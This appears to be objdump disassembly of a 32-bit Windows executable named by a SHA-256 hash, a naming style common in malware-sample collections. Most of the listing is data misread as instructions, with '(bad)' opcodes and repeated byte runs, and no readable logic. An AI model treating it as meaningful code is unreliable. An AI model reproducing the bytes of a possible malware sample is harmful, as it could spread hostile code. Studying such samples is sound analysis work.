
4480814834710f208880b557c9c3bd215982622ae5f1821f74601822fbed3cba.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    al,bh
  401002:	add    eax,DWORD PTR [eax]
  401004:	or     eax,0x520043fb
  401009:	gs je  0x40105c
  40100c:	pop    edi
  40100d:	outs   dx,DWORD PTR ds:[esi]
  40100e:	arpl   WORD PTR [ecx+0x71],ax
  401011:	fs jb  0x401079
  401014:	pop    esi
  401015:	jae    0x401017
  401017:	add    BYTE PTR [ecx+0x6f],bl
  40101a:	popa   
  40101b:	fs push ecx
  40101d:	imul   esp,DWORD PTR [edx+0x72],0x4579722c
  401024:	xor    eax,0x59000041
  401029:	outs   dx,DWORD PTR ds:[esi]
  40102a:	popa   
  40102b:	fs push ecx
  40102d:	imul   esp,DWORD PTR [edx+0x72],0x4579722c
  401034:	adc    eax,0xd2000057
  401039:	fs je  0x401089
  40103c:	repnz arpl WORD PTR [ebp+0x6c],si
  401040:	lock inc edi
  401042:	popa   
  401043:	outs   dx,BYTE PTR ds:[esi]
  401044:	jmp    0xd8175b4
  401049:	add    BYTE PTR [eax],al
  40104b:	add    dh,cl
  40104d:	jno    0x4010b4
  40104f:	popa   
  401050:	loope  0x4010b6
  401052:	inc    esi
  401053:	imul   esp,ecx,0xb9004164
  401059:	jb     0x4010cf
  40105b:	jb     0x40100b
  40105d:	pusha  
  40105e:	je     0x4010a1
  401060:	or     eax,0xca000000
  401065:	fs je  0x4010bf
	...
  401084:	add    BYTE PTR [eax],al
  401086:	mov    ah,0x6d
  401088:	outs   dx,DWORD PTR fs:[esi]
  40108a:	call   0x6364:0x9f694472
  401091:	je     0x401035
  401093:	jno    0x40110e
  401095:	inc    ecx
  401096:	or     eax,0x4a000000
  40109b:	gs je  0x4010eb
  40109e:	push   0x64
  4010a0:	jne    0x40110e
  4010a2:	push   0x716e6148
  4010a7:	ins    BYTE PTR es:[edi],dx
  4010a8:	gs push edi
  4010aa:	or     eax,0x11000000
  4010af:	add    eax,DWORD PTR [eax+0x0]
  4010b2:	stc    
  4010b3:	add    al,BYTE PTR [eax+0x0]
  4010b6:	icebp  
  4010b7:	add    al,BYTE PTR [eax+0x0]
  4010ba:	stc    
  4010bb:	add    al,BYTE PTR [eax+0x0]
  4010be:	inc    ebp
  4010bf:	add    eax,DWORD PTR [eax+0x0]
  4010c2:	pop    ecx
  4010c3:	add    eax,DWORD PTR [eax+0x0]
  4010c6:	sub    eax,0x25004003
  4010cb:	add    eax,DWORD PTR [eax+0x0]
  4010ce:	push   edx
  4010cf:	gs je  0x401122
  4010d2:	pop    ds
  4010d3:	outs   dx,DWORD PTR ds:[esi]
  4010d4:	arpl   WORD PTR [ecx-0xf],ax
  4010d7:	arpl   WORD PTR [edx+0x65],si
  4010da:	(bad)  
  4010db:	jb     0x4010dd
  4010dd:	add    cl,cl
  4010df:	outs   dx,BYTE PTR ds:[esi]
  4010e0:	popa   
  4010e1:	shr    DWORD PTR fs:[eax+0x62],0x72
  4010e6:	in     al,dx
  4010e7:	jno    0x401162
  4010e9:	inc    ebp
	...
  401106:	add    BYTE PTR [eax],al
  401108:	in     eax,0x40
  40110a:	add    BYTE PTR [eax],al
  40110c:	out    0x64,al
  40110e:	jb     0x40117e
  401110:	call   0xfb724480
  401115:	arpl   WORD PTR [esp+ebp*2+0xd],bp
  401119:	add    BYTE PTR [eax],al
  40111b:	add    BYTE PTR [eax-0x409c898e],ch
  401121:	jae    0x401151
  401123:	fs mov ecx,0xb000006b
  401129:	fs ins DWORD PTR es:[edi],dx
  40112b:	jae    0x4010dd
  40112d:	jae    0x40112f
  40112f:	add    BYTE PTR [eax+0x7f637672],ah
  401135:	je     0x401165
  401137:	fs jno 0x4011a6
  40113a:	add    BYTE PTR [eax],al
  40113c:	push   0x7d636d63
  401141:	ja     0x401143
  401143:	add    BYTE PTR [ebx+0x67],al
  401146:	jb     0x4011bc
  401148:	pop    eax
  401149:	pop    edi
  40114a:	ins    BYTE PTR es:[edi],dx
  40114b:	inc    ecx
  40114c:	imul   ebp,DWORD PTR [edi+ebp*2+0x63],0xd
  401154:	arpl   WORD PTR [edi+0x72],sp
  401157:	je     0x401191
  401159:	pop    edi
  40115a:	ins    BYTE PTR es:[edi],dx
  40115b:	inc    ecx
  40115c:	sub    DWORD PTR [edi+ebp*2+0x63],ebp
  401160:	or     eax,0x40000000
  401165:	outs   dx,BYTE PTR ds:[esi]
  401166:	ins    DWORD PTR es:[edi],dx
  401167:	popa   
  401168:	sbb    eax,0x656956
	...
  401189:	add    BYTE PTR [edx],ah
  40118b:	dec    ebp
  40118c:	inc    si
  40118e:	and    al,0x6c
  401190:	gs add bl,ah
  401193:	data16 jb 0x40120a
  401196:	clc    
  401197:	pop    esi
  401198:	ins    BYTE PTR es:[edi],dx
  401199:	push   eax
  40119a:	jmp    FWORD PTR [esp+esi*2+0x65]
  40119e:	out    dx,al
  40119f:	jae    0x4011a1
  4011a1:	add    ch,dl
  4011a3:	bound  esp,QWORD PTR [ecx+0x70]
  4011a6:	int3   
  4011a7:	imul   ebp,DWORD PTR [edi+ebp*2-0x12],0xffffffff
  4011ac:	(bad)  
  4011ad:	jmp    esi
  4011af:	bound  esi,QWORD PTR [edx+0x6e]
  4011b2:	mov    al,0x6b
  4011b4:	xor    esi,DWORD PTR [edx]
  4011b6:	repz arpl WORD PTR [esp+ebp*2+0xd],bp
  4011bb:	add    BYTE PTR [eax],al
  4011bd:	add    dl,cl
  4011bf:	bound  esi,QWORD PTR [eax+edx*2-0x61]
  4011c3:	ins    BYTE PTR es:[edi],dx
  4011c4:	arpl   WORD PTR [ebp-0x62],sp
  4011c7:	jo     0x401211
  4011c9:	lods   al,BYTE PTR gs:[esi]
  4011cb:	outs   dx,DWORD PTR ds:[esi]
  4011cc:	add    BYTE PTR [eax],al
  4011ce:	or     eax,0xd03e200
  4011d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4011d4:	pop    ecx
  4011d5:	add    BYTE PTR ds:0xd0003e7,cl
  4011db:	out    0x3,eax
  4011dd:	add    BYTE PTR ds:0xd0003e7,cl
  4011e3:	out    0x3,eax
  4011e5:	add    BYTE PTR ds:0xd0003e7,cl
  4011eb:	out    0x3,eax
	...
  401209:	add    BYTE PTR [eax],al
  40120b:	add    BYTE PTR ds:0xd0003e7,cl
  401211:	out    0x3,eax
  401213:	add    BYTE PTR ds:0xd0003e7,cl
  401219:	out    0x3,eax
  40121b:	add    BYTE PTR ds:0xd0003e7,cl
  401221:	out    0x3,eax
  401223:	add    BYTE PTR ds:0xd0003e7,cl
  401229:	out    0x3,eax
  40122b:	add    BYTE PTR ds:0xd00049f,cl
  401231:	out    0x3,eax
  401233:	add    BYTE PTR ds:0xd0003e7,cl
  401239:	out    0x3,eax
  40123b:	add    BYTE PTR ds:0xd0003e7,cl
  401241:	out    0x3,eax
  401243:	add    BYTE PTR ds:0xd0003e7,cl
  401249:	out    0x3,eax
  40124b:	add    BYTE PTR ds:0xd0003e7,cl
  401251:	out    0x3,eax
  401253:	add    BYTE PTR ds:0xd0003e7,cl
  401259:	out    0x3,eax
  40125b:	add    BYTE PTR ds:0xd0003e7,cl
  401261:	out    0x3,eax
  401263:	add    BYTE PTR ds:0xd0003e7,cl
  401269:	add    cl,ch
  40126b:	add    ecx,DWORD PTR ds:0x3e900
	...
  40128d:	add    BYTE PTR ds:0xd03e900,cl
  401293:	add    cl,ch
  401295:	add    ecx,DWORD PTR ds:0xd03e900
  40129b:	add    cl,ch
  40129d:	add    ecx,DWORD PTR ds:0xd03e900
  4012a3:	add    cl,ch
  4012a5:	add    ecx,DWORD PTR ds:0xd03e900
  4012ab:	add    cl,ch
  4012ad:	add    ecx,DWORD PTR ds:0xd03e900
  4012b3:	add    cl,ch
  4012b5:	add    ecx,DWORD PTR ds:0xd03e900
  4012bb:	add    cl,ch
  4012bd:	add    ecx,DWORD PTR ds:0xd03e900
  4012c3:	add    cl,ch
  4012c5:	add    ecx,DWORD PTR ds:0xd03e900
  4012cb:	add    cl,ch
  4012cd:	add    ecx,DWORD PTR ds:0xd03e900
  4012d3:	add    cl,ch
  4012d5:	add    ecx,DWORD PTR ds:0xd03e900
  4012db:	add    cl,ch
  4012dd:	add    ecx,DWORD PTR ds:0xd03e900
  4012e3:	add    cl,ch
  4012e5:	add    ecx,DWORD PTR ds:0xd03e900
  4012eb:	add    cl,ch
  4012ed:	add    ecx,DWORD PTR ds:0x3e900
	...
  40130f:	add    BYTE PTR ds:0xd03e900,cl
  401315:	add    cl,ch
  401317:	add    ecx,DWORD PTR ds:0xd03e900
  40131d:	add    BYTE PTR [eax],al
  40131f:	jmp    0xe9401332
  401324:	push   cs
  401325:	add    BYTE PTR [eax],al
  401327:	mov    ecx,0xacffffcd
  40132c:	adc    edi,edi
  40132e:	call   edx
  401330:	xchg   esp,eax
  401331:	xchg   BYTE PTR [edi-0x17],cl
  401334:	push   cs
  401335:	add    BYTE PTR [eax],al
  401337:	jmp    0x940134a
  40133c:	push   cs
  40133d:	inc    BYTE PTR [eax]
  40133f:	loop   0x40134a
  401341:	push   es
  401342:	add    cl,ch
  401344:	test   al,0xfe
  401346:	(bad)  
  401347:	call   0xe940138a
  40134c:	push   cs
  40134d:	add    BYTE PTR [eax],al
  40134f:	xchg   ecx,eax
  401350:	mov    eax,0x1ee8fffd
  401355:	add    BYTE PTR [eax],al
  401357:	jmp    0xe940122a
  40135c:	push   cs
  40135d:	inc    eax
  40135e:	add    cl,ch
  401360:	(bad)  
  401361:	(bad)  
  401362:	(bad)  
  401363:	call   0xec401378
  401368:	push   cs
  401369:	add    DWORD PTR [eax],eax
  40136b:	call   0xec40137e
  401370:	push   cs
  401371:	add    DWORD PTR [eax],eax
  401373:	jmp    0x401378
	...
  401390:	add    BYTE PTR [eax],al
  401392:	push   cs
  401393:	add    BYTE PTR [eax],al
  401395:	jmp    0xe94017c8
  40139a:	push   0xfffffffa
  40139c:	(bad)  
  40139d:	jmp    0xeb4013b0
  4013a2:	push   cs
  4013a3:	add    BYTE PTR [ecx+0x100ee9],al
  4013a9:	jmp    0xe94013cc
  4013ae:	push   cs
  4013af:	adc    BYTE PTR [eax],al
  4013b1:	jmp    0x4013d4
  4013b6:	and    al,0xfe
  4013b8:	(bad)  
  4013b9:	inc    DWORD PTR [esi+edi*8-0x1]
  4013bd:	push   DWORD PTR [esi+edi*8]
  4013c0:	(bad)  
  4013c1:	jmp    DWORD PTR [esi+edi*8]
  4013c4:	(bad)  
  4013c5:	jmp    DWORD PTR [eax-0x76]
  4013c8:	add    eax,DWORD PTR [eax]
  4013ca:	mov    ah,0xfe
  4013cc:	(bad)  
  4013cd:	push   esp
  4013cf:	std    
  4013d0:	(bad)  
  4013d1:	jmp    esp
  4013d3:	std    
  4013d4:	(bad)  
  4013d5:	jmp    esp
  4013d7:	std    
  4013d8:	(bad)  
  4013d9:	push   esp
  4013db:	std    
  4013dc:	(bad)  
  4013dd:	push   esp
  4013df:	std    
  4013e0:	(bad)  
  4013e1:	jmp    esp
  4013e3:	std    
  4013e4:	(bad)  
  4013e5:	jmp    esp
  4013e7:	in     eax,dx
  4013e8:	add    eax,DWORD PTR [eax]
  4013ea:	xchg   esp,eax
  4013eb:	pop    ss
  4013ec:	add    BYTE PTR [eax],al
  4013ee:	mov    ah,0xfd
  4013f0:	(bad)  
  4013f1:	jmp    DWORD PTR [ebp+edi*8+0xffff]
	...
  401414:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401415:	std    
  401416:	(bad)  
  401417:	push   DWORD PTR [ebp+edi*8-0x24b0001]
  40141e:	(bad)  
  40141f:	jmp    DWORD PTR [ebp+edi*8-0x25b0001]
  401426:	(bad)  
  401427:	push   DWORD PTR [ebp+edi*8-0x1]
  40142b:	push   DWORD PTR [ebp+edi*8-0x1]
  40142f:	jmp    DWORD PTR [ebp+edi*8-0x1]
  401433:	jmp    DWORD PTR [ebp+edi*8-0x1]
  401437:	push   DWORD PTR [ebp+edi*8-0x1]
  40143b:	push   DWORD PTR [ebp+ecx*1+0x0]
  40143f:	add    BYTE PTR [edi+edi*8],dl
  401442:	(bad)  
  401443:	jmp    DWORD PTR [ebp+edi*8-0x1]
  401447:	push   DWORD PTR [edi*8-0x18f20001]
  40144e:	add    eax,DWORD PTR [eax]
  401450:	or     eax,0xd0003e7
  401455:	out    0x3,eax
  401457:	add    BYTE PTR ds:0xd0003e7,cl
  40145d:	add    DWORD PTR [eax+0x65],esi
  401460:	xchg   ebp,eax
  401461:	mov    dl,0x3
  401463:	add    BYTE PTR ds:0xd03ab49,cl
  401469:	out    0x13,eax
  40146b:	add    BYTE PTR ds:0xd03ade7,cl
  401471:	out    0xff,eax
  401473:	push   edx
  401475:	out    0x3,al
	...
  401493:	add    BYTE PTR [eax],al
  401495:	add    BYTE PTR ds:0xd0003e7,cl
  40149b:	out    0x3,eax
  40149d:	add    BYTE PTR ds:0x6d0003c7,cl
  4014a3:	adc    DWORD PTR [eax+0x61],esp
  4014a6:	inc    ecx
  4014a7:	dec    eax
  4014a8:	add    al,0x0
  4014aa:	or     eax,0xd002147
  4014af:	out    0xc3,eax
  4014b1:	add    ecx,DWORD PTR ds:0xd000be7
  4014b7:	out    0xa5,eax
  4014b9:	add    ecx,DWORD PTR ds:0xd0003e7
  4014bf:	out    0x3,eax
  4014c1:	add    BYTE PTR ds:0xd0003e7,cl
  4014c7:	daa    
  4014c8:	add    al,0x0
  4014ca:	dec    ebp
  4014cb:	shl    BYTE PTR [ecx+0x65],0xe9
  4014cf:	stc    
  4014d0:	bound  eax,QWORD PTR [eax]
  4014d2:	or     eax,0xd002c93
  4014d7:	out    0xf3,eax
  4014d9:	add    ecx,DWORD PTR ds:0xd0029e7
  4014df:	out    0xad,eax
  4014e1:	add    ecx,DWORD PTR ds:0xd03e900
  4014e7:	add    cl,ch
  4014e9:	add    ecx,DWORD PTR ds:0xd03e900
  4014ef:	add    BYTE PTR [ecx-0x16c1f2fd],ch
  4014f5:	add    ecx,DWORD PTR ds:0x3e900
	...
  401517:	add    BYTE PTR ds:0xd03e900,cl
  40151d:	add    cl,ch
  40151f:	add    ecx,DWORD PTR ds:0xd03e900
  401525:	add    cl,ch
  401527:	add    ecx,DWORD PTR ds:0xd03e900
  40152d:	add    cl,ch
  40152f:	add    ecx,DWORD PTR ds:0xd03e900
  401535:	add    cl,ch
  401537:	add    ecx,DWORD PTR ds:0xd03e900
  40153d:	add    cl,ch
  40153f:	add    ecx,DWORD PTR ds:0xd03e900
  401545:	add    cl,ch
  401547:	add    ecx,DWORD PTR ds:0xd03e900
  40154d:	add    cl,ch
  40154f:	add    ecx,DWORD PTR ds:0xd03e900
  401555:	add    cl,ch
  401557:	add    ecx,DWORD PTR ds:0xd03e900
  40155d:	add    cl,ch
  40155f:	add    ecx,DWORD PTR ds:0xd03e900
  401565:	add    cl,ch
  401567:	add    ecx,DWORD PTR ds:0xd03e900
  40156d:	add    cl,ch
  40156f:	add    ecx,DWORD PTR ds:0xd03e900
  401575:	add    cl,ch
  401577:	add    ecx,DWORD PTR ds:0xe90000
	...
  401599:	add    BYTE PTR [esi],cl
  40159b:	add    BYTE PTR [eax],al
  40159d:	jmp    0xe94015b0
  4015a2:	push   cs
  4015a3:	add    BYTE PTR [eax],al
  4015a5:	jmp    0xe94015b8
  4015aa:	push   cs
  4015ab:	add    BYTE PTR [eax],al
  4015ad:	jmp    0xe94015c0
  4015b2:	push   cs
  4015b3:	add    BYTE PTR [eax],al
  4015b5:	jmp    0xe94015c8
  4015ba:	push   cs
  4015bb:	add    BYTE PTR [eax],al
  4015bd:	jmp    0xe94015d0
  4015c2:	push   cs
  4015c3:	add    BYTE PTR [eax],al
  4015c5:	jmp    0xe94015d8
  4015ca:	push   cs
  4015cb:	add    BYTE PTR [eax],al
  4015cd:	jmp    0xe94015e0
  4015d2:	push   cs
  4015d3:	add    BYTE PTR [eax],al
  4015d5:	jmp    0xe94015e8
  4015da:	push   cs
  4015db:	add    BYTE PTR [eax],al
  4015dd:	jmp    0xe94015f0
  4015e2:	push   cs
  4015e3:	add    BYTE PTR [eax],al
  4015e5:	jmp    0xe94015f8
  4015ea:	push   cs
  4015eb:	add    BYTE PTR [eax],al
  4015ed:	jmp    0xe9401600
  4015f2:	push   cs
  4015f3:	add    BYTE PTR [eax],al
  4015f5:	jmp    0xe9401608
  4015fa:	push   cs
  4015fb:	add    BYTE PTR [eax],al
  4015fd:	jmp    0x401602
	...
  40161a:	add    BYTE PTR [eax],al
  40161c:	push   cs
  40161d:	add    BYTE PTR [eax],al
  40161f:	jmp    0xe9401632
  401624:	push   cs
  401625:	add    BYTE PTR [eax],al
  401627:	jmp    0xe940163a
  40162c:	push   cs
  40162d:	add    BYTE PTR [eax],al
  40162f:	add    BYTE PTR [edx+eax*1+0x0],dh
  401633:	add    BYTE PTR [edx+eax*1+0x0],dh
  401637:	add    BYTE PTR [edx+eax*1+0x0],ah
  40163b:	add    BYTE PTR [edx+eax*1+0x0],ah
  40163f:	add    BYTE PTR [edx+eax*1],dh
  401642:	add    BYTE PTR [eax],al
  401644:	xor    al,0x2
  401646:	add    BYTE PTR [eax],al
  401648:	and    al,0x2
  40164a:	add    BYTE PTR [eax],al
  40164c:	and    al,0x2
  40164e:	add    BYTE PTR [eax],al
  401650:	xor    al,0x2
  401652:	add    BYTE PTR [eax],al
  401654:	xor    al,0x2
  401656:	add    BYTE PTR [eax],al
  401658:	and    al,0x2
  40165a:	add    BYTE PTR [eax],al
  40165c:	and    al,0x2
  40165e:	add    BYTE PTR [eax],al
  401660:	hlt    
  401661:	add    DWORD PTR [eax],eax
  401663:	add    ah,dh
  401665:	add    DWORD PTR [eax],eax
  401667:	add    ah,ah
  401669:	add    DWORD PTR [eax],eax
  40166b:	add    ah,ah
  40166d:	add    DWORD PTR [eax],eax
  40166f:	add    ah,dh
  401671:	add    DWORD PTR [eax],eax
  401673:	add    ah,dh
  401675:	add    DWORD PTR [eax],eax
  401677:	add    ah,ah
  401679:	add    DWORD PTR [eax],eax
  40167b:	add    ah,ah
  40167d:	add    DWORD PTR [eax],eax
	...
  40169b:	add    BYTE PTR [eax],al
  40169d:	add    BYTE PTR [ecx+eax*1+0x1b40000],dh
  4016a4:	add    BYTE PTR [eax],al
  4016a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016a7:	add    DWORD PTR [eax],eax
  4016a9:	add    BYTE PTR [ecx+eax*1+0x1b40000],ah
  4016b0:	add    BYTE PTR [eax],al
  4016b2:	mov    ah,0x1
  4016b4:	add    BYTE PTR [eax],al
  4016b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016b7:	add    DWORD PTR [eax],eax
  4016b9:	add    BYTE PTR [ecx+eax*1+0x1740000],ah
  4016c0:	add    BYTE PTR [eax],al
  4016c2:	je     0x4016c5
  4016c4:	add    BYTE PTR [eax],al
  4016c6:	or     eax,0xd0003e7
  4016cb:	out    0x3,eax
  4016cd:	add    BYTE PTR ds:0xd0003e7,cl
  4016d3:	out    0x3,eax
  4016d5:	add    BYTE PTR ds:0xd0003e7,cl
  4016db:	out    0x3,eax
  4016dd:	add    BYTE PTR ds:0xd0003e7,cl
  4016e3:	out    0x3,eax
  4016e5:	add    BYTE PTR ds:0xd0003e7,cl
  4016eb:	out    0x3,eax
  4016ed:	add    BYTE PTR ds:0xd0003e7,cl
  4016f3:	out    0x3,eax
  4016f5:	add    BYTE PTR ds:0xd0003e7,cl
  4016fb:	out    0x3,eax
  4016fd:	add    BYTE PTR ds:0x3e7,cl
	...
  40171f:	add    BYTE PTR ds:0xd0003e7,cl
  401725:	add    DWORD PTR [edi-0x58baf2fd],esp
  40172b:	add    ecx,DWORD PTR ds:0xd03a715
  401731:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401733:	add    ecx,DWORD PTR ds:0xd03a6dd
  401739:	leave  
  40173a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40173b:	add    ecx,DWORD PTR ds:0xd03a10d
  401741:	daa    
  401742:	mov    eax,ds:0xa11d0d03
  401747:	add    ecx,DWORD PTR ds:0xd03a13b
  40174d:	arpl   WORD PTR [ecx-0x5e78f2fd],sp
  401753:	add    ecx,DWORD PTR ds:0xd03a18f
  401759:	stos   DWORD PTR es:[edi],eax
  40175a:	mov    eax,ds:0xf9000d03
  40175f:	mov    eax,ds:0xa1c5000e
  401764:	push   cs
  401765:	add    ch,bl
  401767:	mov    eax,ds:0xa227000e
  40176c:	push   cs
  40176d:	add    BYTE PTR [edi],bl
  40176f:	mov    ds:0xa213000e,al
  401774:	push   cs
  401775:	add    BYTE PTR [ecx-0x5e],ch
  401778:	push   cs
  401779:	add    BYTE PTR [ebx-0x5e],bl
  40177c:	push   cs
  40177d:	add    BYTE PTR [ebp+0x25000ea2],dl
  401783:	mov    ds:0x0,al
	...
  4017a0:	add    BYTE PTR [eax],al
  4017a2:	push   cs
  4017a3:	add    BYTE PTR ds:0x55000ea2,dh
  4017a9:	mov    ds:0xa2d9000e,al
  4017ae:	push   cs
  4017af:	add    BYTE PTR ds:0xf5000ea3,al
  4017b5:	mov    ds:0xa29b000e,al
  4017ba:	push   cs
  4017bb:	add    BYTE PTR [ebp-0x6afff15e],cl
  4017c1:	mov    ds:0xa36f000e,al
  4017c6:	push   cs
  4017c7:	add    cl,ch
  4017c9:	add    ecx,DWORD PTR ds:0xeb82d00
  4017cf:	add    BYTE PTR [ebx-0x48],cl
  4017d2:	push   cs
  4017d3:	add    BYTE PTR [ebp-0x48],ch
  4017d6:	push   cs
  4017d7:	add    BYTE PTR [edi-0x49],bh
  4017da:	push   cs
  4017db:	add    BYTE PTR [ebp-0x48],al
  4017de:	push   cs
  4017df:	add    BYTE PTR ds:0xb000eb8,ah
  4017e5:	mov    eax,0xb7ad000e
  4017ea:	push   cs
  4017eb:	add    cl,ch
  4017ed:	add    ecx,DWORD PTR ds:0xeb71700
  4017f3:	add    BYTE PTR [eax],al
  4017f5:	cdq    
  4017f6:	pop    eax
  4017f7:	(bad)  
  4017f8:	jmp    FWORD PTR [edx]
  4017fa:	ret    0xffff
  4017fd:	fs mov eax,0xc058ffff
  401803:	(bad)  
  401804:	(bad)  
  401805:	fiadd  WORD PTR [eax]
	...
  401823:	add    BYTE PTR [ebx-0x5c3d0001],bh
  401829:	(bad)  
  40182a:	jmp    esp
  40182c:	fwait
  40182d:	(bad)  
  40182e:	jmp    esi
  401830:	mov    ds:0x9874ffff,eax
  401835:	(bad)  
  401836:	(bad)  
  401837:	js     0x4017b9
  401839:	(bad)  
  40183a:	dec    DWORD PTR [eax+0x78]
  40183d:	(bad)  
  40183e:	dec    DWORD PTR [eax-0x35000080]
  401844:	jnp    0x401845
  401846:	jmp    DWORD PTR [esi+0x60]
  401849:	(bad)  
  40184a:	(bad)  
  40184b:	call   0xaf40185e
  401850:	push   edi
  401851:	(bad)  
  401852:	(bad)  
  401853:	call   0x9b401866
  401858:	mov    cl,0xfe
  40185a:	dec    DWORD PTR [edx-0x6b000157]
  401860:	mov    cl,0xfe
  401862:	jmp    DWORD PTR [esi-0x57]
  401865:	(bad)  
  401866:	inc    DWORD PTR [ecx+esi*4-0x2]
  40186a:	inc    DWORD PTR [ecx+ebp*4-0x2]
  40186e:	push   DWORD PTR [eax]
  401870:	mov    cl,0xfe
  401872:	inc    DWORD PTR [ecx+ebp*4]
  401875:	(bad)  
  401876:	(bad)  
  401877:	call   0xf74016ec
  40187c:	push   0x7306fffe
  401881:	(bad)  
  401882:	call   DWORD PTR [esi]
  401884:	imul   edi,esi,0xffffffff
  401887:	xor    al,BYTE PTR [eax]
	...
  4018a5:	add    BYTE PTR [ebx-0x2],dh
  4018a8:	(bad)  
  4018a9:	call   DWORD PTR [edx-0x66]
  4018ac:	add    eax,DWORD PTR [eax]
  4018ae:	(bad)  
  4018af:	cdq    
  4018b0:	add    eax,DWORD PTR [eax]
  4018b2:	and    al,0x9a
  4018b4:	add    eax,DWORD PTR [eax]
  4018b6:	jmp    0x399:0x8a000399
  4018bd:	add    ah,ch
  4018bf:	cdq    
  4018c0:	add    eax,DWORD PTR [eax]
  4018c2:	stos   BYTE PTR es:[edi],al
  4018c3:	cdq    
  4018c4:	add    eax,DWORD PTR [eax]
  4018c6:	mov    eax,0x7a000399
  4018cb:	cdq    
  4018cc:	add    eax,DWORD PTR [eax]
  4018ce:	fs fwait
  4018d0:	add    eax,DWORD PTR [eax]
  4018d2:	cmp    BYTE PTR [ebx-0x6483fffd],bl
  4018d8:	add    eax,DWORD PTR [eax]
  4018da:	test   BYTE PTR [ebx-0x64a1fffd],bl
  4018e0:	add    eax,DWORD PTR [eax]
  4018e2:	mov    al,ds:0xa000039c
  4018e7:	pushf  
  4018e8:	add    eax,DWORD PTR [eax]
  4018ea:	nop
  4018eb:	pushf  
  4018ec:	add    eax,DWORD PTR [eax]
  4018ee:	mov    ds,WORD PTR [ebx+eax*1+0x39cf600]
  4018f5:	add    BYTE PTR [ebx+ebx*4+0x3],dl
  4018f9:	add    BYTE PTR [ebx+ebx*4],ah
  4018fc:	add    eax,DWORD PTR [eax]
  4018fe:	sbb    bl,BYTE PTR [ebx-0x6617fffd]
  401904:	add    eax,DWORD PTR [eax]
  401906:	aam    0x99
  401908:	add    eax,DWORD PTR [eax]
	...
  401926:	add    BYTE PTR [eax],al
  401928:	retf   0x39e
  40192b:	add    al,bh
  40192d:	lea    eax,[ebx]
  40192f:	add    BYTE PTR [eax-0x67],dh
  401932:	add    eax,DWORD PTR [eax]
  401934:	dec    edx
  401935:	cdq    
  401936:	add    eax,DWORD PTR [eax]
  401938:	xor    BYTE PTR [ecx-0x66cbfffd],bl
  40193e:	add    eax,DWORD PTR [eax]
  401940:	or     eax,0xd03a769
  401945:	xchg   edi,eax
  401946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401947:	add    ecx,DWORD PTR ds:0xd03a7a3
  40194d:	xchg   edi,eax
  40194e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40194f:	add    ecx,DWORD PTR ds:0xd03a7c7
  401955:	mov    ch,0xa7
  401957:	add    ecx,DWORD PTR ds:0xd03a6e1
  40195d:	std    
  40195e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40195f:	add    ecx,DWORD PTR ds:0xd03a6d5
  401965:	adc    esp,DWORD PTR [edi-0x58e4f2fd]
  40196b:	add    ecx,DWORD PTR ds:0xd03a70f
  401971:	cmc    
  401972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401973:	add    ecx,DWORD PTR ds:0xd03a667
  401979:	ja     0x401921
  40197b:	add    ecx,DWORD PTR ds:0xd03a67b
  401981:	xchg   ebx,eax
  401982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401983:	add    ecx,DWORD PTR ds:0xd03a61f
  401989:	adc    DWORD PTR [esi+0x3],esp
	...
  4019a7:	add    BYTE PTR [eax],al
  4019a9:	add    BYTE PTR ds:0xd03abab,cl
  4019af:	(bad)  
  4019b0:	stos   DWORD PTR es:[edi],eax
  4019b1:	add    ecx,DWORD PTR ds:0xd03ab9b
  4019b7:	fild   QWORD PTR [ebx-0x543af2fd]
  4019bd:	add    ecx,DWORD PTR ds:0xd03abf7
  4019c3:	in     eax,dx
  4019c4:	mov    ds:0xa2cd0d03,al
  4019c9:	add    ecx,DWORD PTR ds:0xd03a2e1
  4019cf:	jmp    0x401973
  4019d1:	add    ecx,DWORD PTR ds:0xd03a2fb
  4019d7:	add    BYTE PTR [ebp-0x6afff15c],dh
  4019dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019de:	push   cs
  4019df:	add    BYTE PTR [ecx-0x5c],dh
  4019e2:	push   cs
  4019e3:	add    BYTE PTR [ebx-0x5c],ch
  4019e6:	push   cs
  4019e7:	add    BYTE PTR [ebp-0x5c],cl
  4019ea:	push   cs
  4019eb:	add    BYTE PTR [edi],dl
  4019ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019ee:	push   cs
  4019ef:	add    BYTE PTR [ecx],ah
  4019f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019f2:	push   cs
  4019f3:	add    cl,dh
  4019f5:	mov    ds:0xa3d1000e,eax
  4019fa:	push   cs
  4019fb:	add    ch,dh
  4019fd:	mov    ds:0xa3ef000e,eax
  401a02:	push   cs
  401a03:	add    BYTE PTR [ebx-0x72fff171],dl
  401a09:	(bad)  
  401a0a:	push   cs
  401a0b:	add    BYTE PTR [ecx+0x8f],ah
	...
  401a29:	add    BYTE PTR [eax],al
  401a2b:	add    BYTE PTR [esi],cl
  401a2d:	add    BYTE PTR [ebx+0x37000e8f],ah
  401a33:	(bad)  
  401a34:	push   cs
  401a35:	add    BYTE PTR [ebx+0x7b000e8f],cl
  401a3b:	(bad)  
  401a3c:	push   cs
  401a3d:	add    bh,dl
  401a3f:	mov    cs,WORD PTR [esi]
  401a41:	add    bh,dl
  401a43:	mov    cs,WORD PTR [esi]
  401a45:	add    bl,cl
  401a47:	mov    cs,WORD PTR [esi]
  401a49:	add    BYTE PTR [ebp-0xafff172],ch
  401a4f:	mov    cs,WORD PTR [esi]
  401a51:	add    BYTE PTR [ebx],al
  401a53:	(bad)  
  401a54:	push   cs
  401a55:	add    BYTE PTR [ebx],al
  401a57:	(bad)  
  401a58:	push   cs
  401a59:	add    bl,dh
  401a5b:	mov    cs,WORD PTR [esi]
  401a5d:	add    BYTE PTR [ebx],dl
  401a5f:	mov    cs,WORD PTR [esi]
  401a61:	add    cl,dl
